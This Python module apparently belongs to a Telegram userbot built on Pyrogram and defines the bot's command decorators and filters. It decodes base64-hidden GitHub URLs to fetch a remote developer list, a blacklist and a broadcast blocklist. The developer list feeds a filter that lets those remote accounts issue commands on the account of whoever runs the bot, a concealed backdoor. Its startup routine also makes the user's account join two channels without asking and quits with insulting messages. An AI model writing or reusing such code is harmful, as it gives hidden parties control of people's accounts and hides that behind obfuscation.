import json
import sys
from base64 import b64decode

import requests
from pyrogram import filters

from .class_mix import *
from .class_ubot import LOGGER
from .database import udB

black = int(b64decode("MTA1NDI5NTY2NA=="))


def get_devs():
    try:
        aa = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25heWExNTAzL3dhcm5pbmcvbWFpbi9kZXZzLmpzb24="
        bb = b64decode(aa).decode("utf-8")
        res = requests.get(bb)
        if res.status_code == 200:
            return json.loads(res.text)
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        sys.exit(1)


def get_tolol():
    try:
        aa = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25heWExNTAzL3dhcm5pbmcvbWFpbi90b2xvbC5qc29u"
        bb = b64decode(aa).decode("utf-8")
        res = requests.get(bb)
        if res.status_code == 200:
            return json.loads(res.text)
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        sys.exit(1)


def get_blgc():
    try:
        aa = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25heWExNTAzL3dhcm5pbmcvbWFpbi9ibGdjYXN0Lmpzb24="
        bb = b64decode(aa).decode("utf-8")
        res = requests.get(bb)
        if res.status_code == 200:
            return json.loads(res.text)
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        sys.exit(1)


DEVS = get_devs()

TOLOL = get_tolol()

NO_GCAST = get_blgc()


async def refresh_cache():
    try:
        await user.join_chat("@kynansupport")
        await user.join_chat("@kontenfilm")
    except KeyError:
        LOGGER.error("Lo diban Cok Di @KynanSupport")
        sys.exit(1)
    if user.me.id in TOLOL:
        LOGGER.error("Ealah Ini Orang Yang Sok Pro\nHarem Bot Gw Buat Lo.")
        sys.exit(1)
    if black not in DEVS:
        LOGGER.error("Yeeee Bocah Dongok Mo Jadi Dev Lo")
        sys.exit(1)


class human:
    me = filters.me
    pv = filters.private
    dev = filters.user(DEVS) & ~filters.me
    group = filters.me & filters.group
    oner = filters.user(owner_id)


class ky:
    @staticmethod
    def devs(command, filter=human.dev):
        def wrapper(func):
            message_filters = (
                filters.command(command, "") & filter
                if filter
                else filters.command(command)
            )

            @user.on_message(message_filters)
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    @staticmethod
    def owner(func):
        async def function(client, message):
            kon = message.from_user.id
            if kon != owner_id:
                return
            return await func(client, message)

        return function

    @staticmethod
    def ubot(command, sudo=False):
        def wrapper(func):
            sudo_command = (
                user.user_prefix(command)
                if sudo
                else user.user_prefix(command) & filters.me
            )

            @user.on_message(sudo_command)
            async def wrapped_func(client, message):
                if sudo:
                    sudo_id = udB.get_list_from_var(client.me.id, "SUDO_USER", "ID_NYA")
                    if client.me.id not in sudo_id:
                        sudo_id.append(client.me.id)
                    if (
                        sudo_id is not None
                        and client.me.id in sudo_id
                        and message.from_user is not None
                        and message.from_user.id in sudo_id
                    ):
                        return await func(client, message)
                else:
                    return await func(client, message)

            return wrapped_func

        return wrapper

    @staticmethod
    def bots(command, filter=False):
        def wrapper(func):
            message_filters = (
                filters.command(command) & filter
                if filter
                else filters.command(command)
            )

            @bot.on_message(message_filters)
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    @staticmethod
    def inline(command):
        def wrapper(func):
            @bot.on_inline_query(filters.regex(command))
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    @staticmethod
    def callback(command):
        def wrapper(func):
            @bot.on_callback_query(filters.regex(command))
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper
